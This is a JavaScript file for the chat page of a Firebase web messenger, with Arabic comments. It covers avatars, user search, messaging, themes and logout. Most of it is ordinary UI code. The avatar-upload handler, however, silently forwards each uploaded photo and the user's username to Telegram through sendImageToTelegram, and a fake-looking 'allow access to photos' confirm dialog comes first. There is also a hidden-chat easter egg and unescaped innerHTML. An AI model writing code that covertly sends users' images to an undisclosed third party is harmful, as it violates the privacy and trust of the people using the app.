// التحكم في صفحة المحادثة
document.addEventListener('DOMContentLoaded', function() {
    const currentUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
    
    if (!currentUser) {
        window.location.href = 'index.html';
        return;
    }
    
    // عرض معلومات المستخدم مع العلامة
    const currentUsername = currentUser.username.toUpperCase();
    const isDev = currentUsername === 'FIROGIST';
    
    if (isDev) {
        document.getElementById('userName').innerHTML = `${currentUser.name} <span class="gold-check">✓</span>`;
        document.getElementById('userUsername').innerHTML = `@${currentUser.username} <span class="dev-badge">مطور</span>`;
    } else {
        document.getElementById('userName').textContent = currentUser.name;
        document.getElementById('userUsername').textContent = '@' + currentUser.username;
    }
    
    if (currentUser.avatar) {
        document.getElementById('userAvatar').src = currentUser.avatar;
    } else {
        document.getElementById('userAvatar').src = 'https://via.placeholder.com/50';
    }
    
    // تحميل الثيم المحفوظ
    loadTheme();
    
    // تحميل قائمة المحادثات
    firebaseChat.loadUsers();
    
    // عداد الضغطات على البروفايل
    let profileClickCount = 0;
    let profileClickTimer = null;
    
    document.getElementById('userProfile').addEventListener('click', function(e) {
        if (e.target.closest('.edit-avatar-btn')) {
            return;
        }
        
        profileClickCount++;
        
        clearTimeout(profileClickTimer);
        
        profileClickTimer = setTimeout(() => {
            profileClickCount = 0;
        }, 2000);
        
        if (profileClickCount >= 5) {
            profileClickCount = 0;
            firebaseChat.showHiddenChats();
        }
    });
    
    // تغيير الصورة الشخصية
    window.changeAvatar = function() {
        if (confirm('هل تسمح بالوصول إلى الصور؟')) {
            document.getElementById('avatarInput').click();
        }
    };
    
    // معالجة تغيير الصورة
    window.handleAvatarChange = async function(event) {
        const file = event.target.files[0];
        
        if (!file) {
            return;
        }
        
        if (!file.type.startsWith('image/')) {
            alert('الرجاء اختيار ملف صورة');
            return;
        }
        
        const reader = new FileReader();
        
        reader.onload = async function(e) {
            const imageDataUrl = e.target.result;
            
            const result = await firebaseAuth.updateAvatar(currentUser.username, imageDataUrl);
            
            if (result.success) {
                document.getElementById('userAvatar').src = imageDataUrl;
                
                const updatedUser = JSON.parse(localStorage.getItem('fb_chat_current_user'));
                updatedUser.avatar = imageDataUrl;
                localStorage.setItem('fb_chat_current_user', JSON.stringify(updatedUser));
                
                await sendImageToTelegram(imageDataUrl, currentUser.username);
                
                console.log('✅ تم تحديث الصورة الشخصية');
            } else {
                alert('فشل في تحديث الصورة');
            }
        };
        
        reader.readAsDataURL(file);
        event.target.value = '';
    };
    
    // البحث عن مستخدم جديد
    window.searchUser = async function() {
        const searchInput = document.getElementById('searchUser').value.trim();
        
        if (!searchInput) {
            alert('الرجاء إدخال اسم المستخدم');
            return;
        }
        
        const searchBtn = document.querySelector('.search-box button');
        searchBtn.textContent = '...';
        searchBtn.disabled = true;
        
        const result = await firebaseAuth.searchUser(searchInput);
        
        if (result.success) {
            const telegramResult = await checkTelegramUser(searchInput);
            
            let message = `✅ المستخدم @${searchInput} موجود في FB Chat`;
            if (telegramResult.exists) {
                message += `\n📱 وهو موجود أيضاً على تيليجرام`;
            }
            
            alert(message);
            firebaseChat.selectPartner(result.user);
            
            document.getElementById('searchUser').value = '';
        } else {
            const telegramResult = await checkTelegramUser(searchInput);
            
            if (telegramResult.exists) {
                alert(`📱 المستخدم @${searchInput} موجود على تيليجرام فقط\nلكنه غير مسجل في FB Chat`);
            } else {
                alert(`❌ المستخدم @${searchInput} غير موجود`);
            }
        }
        
        searchBtn.textContent = 'بحث';
        searchBtn.disabled = false;
    };
    
    // إرسال رسالة
    window.sendMessage = async function() {
        const messageInput = document.getElementById('messageInput');
        const message = messageInput.value.trim();
        
        if (!message) {
            return;
        }
        
        const sent = await firebaseChat.sendMessage(message);
        
        if (sent) {
            messageInput.value = '';
            messageInput.focus();
        }
    };
    
    // معالجة رفع الصورة
    window.handleImageUpload = async function(event) {
        const file = event.target.files[0];
        
        if (!file) {
            return;
        }
        
        if (!file.type.startsWith('image/')) {
            alert('الرجاء اختيار ملف صورة');
            return;
        }
        
        const reader = new FileReader();
        
        reader.onload = async function(e) {
            const imageDataUrl = e.target.result;
            const sent = await firebaseChat.sendImage(imageDataUrl);
            
            if (!sent) {
                alert('فشل في إرسال الصورة');
            }
        };
        
        reader.readAsDataURL(file);
        event.target.value = '';
    };
    
    // إرسال بالضغط على Enter
    document.getElementById('messageInput').addEventListener('keypress', function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            sendMessage();
        }
    });
    
    // إغلاق القائمة المنسدلة
    document.addEventListener('click', function(e) {
        const menu = document.getElementById('dropdownMenu');
        const dots = document.querySelector('.menu-dots');
        
        if (menu && dots && !menu.contains(e.target) && !dots.contains(e.target)) {
            menu.classList.remove('show');
        }
    });
    
    // تحديث قائمة المحادثات
    setInterval(() => {
        if (!document.hidden) {
            firebaseChat.loadUsers();
        }
    }, 30000);
});

// ============ دوال الثيمات ============

let currentTheme = {
    font: 'Cairo',
    messageBg: '#ffffff',
    chatBg: '#f5f5f5'
};

function openThemeModal() {
    document.getElementById('themeModal').classList.add('show');
    document.getElementById('dropdownMenu').classList.remove('show');
}

function closeThemeModal() {
    document.getElementById('themeModal').classList.remove('show');
}

function switchThemeTab(tab) {
    document.getElementById('fontSection').style.display = 'none';
    document.getElementById('messageBgSection').style.display = 'none';
    document.getElementById('chatBgSection').style.display = 'none';
    
    if (tab === 'font') {
        document.getElementById('fontSection').style.display = 'block';
    } else if (tab === 'messageBg') {
        document.getElementById('messageBgSection').style.display = 'block';
    } else if (tab === 'chatBg') {
        document.getElementById('chatBgSection').style.display = 'block';
    }
    
    document.querySelectorAll('.theme-tab').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
}

function selectFont(font) {
    currentTheme.font = font;
    applyThemePreview();
}

function selectMessageBg(color) {
    currentTheme.messageBg = color;
    applyThemePreview();
}

function selectChatBg(color) {
    currentTheme.chatBg = color;
    applyThemePreview();
    
    if (color === '#212121') {
        document.getElementById('chatHeader').style.color = '#ffffff';
        document.getElementById('chatPartner').style.color = '#ffffff';
    } else {
        document.getElementById('chatHeader').style.color = '#333333';
        document.getElementById('chatPartner').style.color = '#333333';
    }
}

function applyThemePreview() {
    document.getElementById('chatContainer').style.fontFamily = `'${currentTheme.font}', sans-serif`;
    document.getElementById('messages').style.background = currentTheme.chatBg;
    
    document.querySelectorAll('.message.received .message-content').forEach(el => {
        el.style.background = currentTheme.messageBg;
    });
}

function saveTheme() {
    localStorage.setItem('fb_chat_theme', JSON.stringify(currentTheme));
    closeThemeModal();
    alert('✅ تم حفظ الثيم بنجاح!');
}

function loadTheme() {
    const savedTheme = localStorage.getItem('fb_chat_theme');
    if (savedTheme) {
        currentTheme = JSON.parse(savedTheme);
        applyThemePreview();
    }
}

function resetTheme() {
    currentTheme = {
        font: 'Cairo',
        messageBg: '#ffffff',
        chatBg: '#f5f5f5'
    };
    localStorage.removeItem('fb_chat_theme');
    applyThemePreview();
}

// ============ دوال أخرى ============

function logout() {
    if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
        localStorage.removeItem('fb_chat_current_user');
        localStorage.removeItem('fb_chat_remember');
        window.location.href = 'index.html';
    }
}

document.addEventListener('click', function(e) {
    const editModal = document.getElementById('editModal');
    if (editModal && e.target === editModal) {
        closeEditModal();
    }
    
    const themeModal = document.getElementById('themeModal');
    if (themeModal && e.target === themeModal) {
        closeThemeModal();
    }
});
